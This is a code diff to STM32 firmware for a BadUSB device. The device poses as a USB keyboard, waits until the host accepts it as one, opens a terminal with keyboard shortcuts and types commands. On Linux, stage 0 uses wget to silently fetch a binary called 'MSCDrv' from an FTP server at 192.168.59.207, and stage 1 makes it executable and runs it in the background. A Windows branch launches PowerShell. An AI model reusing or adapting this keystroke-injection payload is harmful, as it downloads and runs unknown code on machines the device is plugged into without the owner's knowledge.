@@ -255,7 +255,7 @@ void SystemClock_Config(void);
 #if Target == FPGA
   #define StrokeSlot 35
   #define PlugSlot 50
-  #define ShortcutSlot 600
+  #define ShortcutSlot 1000
   #define SwitchDeviceSlot 3000
   #define InjectStringSlot 1000
 #elif Target == Desktop
@@ -290,6 +290,9 @@ uint8_t recv_buffer[USBD_CUSTOMHID_INREPORT_BUF_SIZE];
 0x85, 0x66, 0x00, 0x02, 0x03, \
 }\
 
+#define LinuxTerminal {130, 131, 'T'}
+#define WindowsTerminal {132, 'R'}
+
 int InterruptFlag = 0;
 int InterruptCnt = 0;
 int PrintCnt = 0;
@@ -310,6 +313,7 @@ void PrintRecvBuf(uint8_t Recv_Buf[USBD_CUSTOMHID_INREPORT_BUF_SIZE]);
 void InitKeyboardStatus();
 void Convert2CapsMap(uint8_t LowerCaseMap[MapLen]);
 void InterruptTrap(int *InterruptFlag);
+int TestHID();
 void BadUSB_Attack(int stage);
 
 /* USER CODE END 0 */
@@ -367,6 +371,7 @@ int main(void)
 		  while(1){
 			  if(!Flash_Busy){
 				  SwitchToHID();
+				  while(!TestHID());
 				  //Attack begin
 				  BadUSB_Attack(0);
 				  break;
@@ -599,21 +604,30 @@ void InterruptTrap(int *InterruptFlag){
 	}
 }
 
+int TestHID(){
+	SimulateKeyStroke(128);
+	uint8_t PrevState = recv_buffer[0]&0x02;
+	for(int i = 0; i < 4; i++)
+		SimulateKeyStroke(128);
+	uint8_t CurrState = recv_buffer[0]&0x02;
+	return PrevState == CurrState;
+}
+
 void BadUSB_Attack(int stage){
 #if Target == FPGA
 	if(stage == 0){
-		uint8_t StartLinuxTerminal[3] = {130, 131, 'T'};
+		uint8_t Terminal[3] = LinuxTerminal;
 		char AttackStr0[256];
 		strcpy(AttackStr0,
-				"\n\ncd /home/user/Templates\nwget ftp://anonymous:@192.168.59.207/MSCDrv > /dev/null 2>&1 &\nexit\n");
-		SimulateShortcutKey(StartLinuxTerminal, 3);
+				"cd /home/user/Templates\nwget ftp://anonymous:@192.168.59.207/MSCDrv > /dev/null 2>&1 &\nexit\n");
+		SimulateShortcutKey(Terminal, 3);
 		SimulateKeyStrokes(AttackStr0, strlen(AttackStr0), &PrintCnt);
 	}else if(stage == 1){
-		uint8_t StartLinuxTerminal[3] = {130, 131, 'T'};
+		uint8_t Terminal[3] = LinuxTerminal;
 		char AttackStr1[256];
 		strcpy(AttackStr1,
-				"\n\ncd /home/user/Templates\nchmod 777 MSCDrv\n./MSCDrv > /dev/null 2>&1 &\nexit\n");
-		SimulateShortcutKey(StartLinuxTerminal, 3);
+				"cd /home/user/Templates\nchmod 777 MSCDrv\n./MSCDrv > /dev/null 2>&1 &\nexit\n");
+		SimulateShortcutKey(Terminal, 3);
 		SimulateKeyStrokes(AttackStr1, strlen(AttackStr1), &PrintCnt);
 	}else{    //test
 		char AttackStr[256];
@@ -622,11 +636,11 @@ void BadUSB_Attack(int stage){
 	}
 #elif Target == Desktop
 	if(stage == 0){
-		uint8_t StartWindowsTerminal[2] = {132, 'R'};
+		uint8_t Terminal[2] = WindowsTerminal;
 		char AttackStr[256], AttackStr1[256];
 		strcpy(AttackStr, "powershell\n");
 		strcpy(AttackStr1, "ls -a\n\nexit\n");
-		SimulateShortcutKey(StartWindowsTerminal, 2);
+		SimulateShortcutKey(Terminal, 2);
 		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
 		HAL_Delay(InjectStringSlot);
 		SimulateKeyStrokes(AttackStr1, strlen(AttackStr1), &PrintCnt);
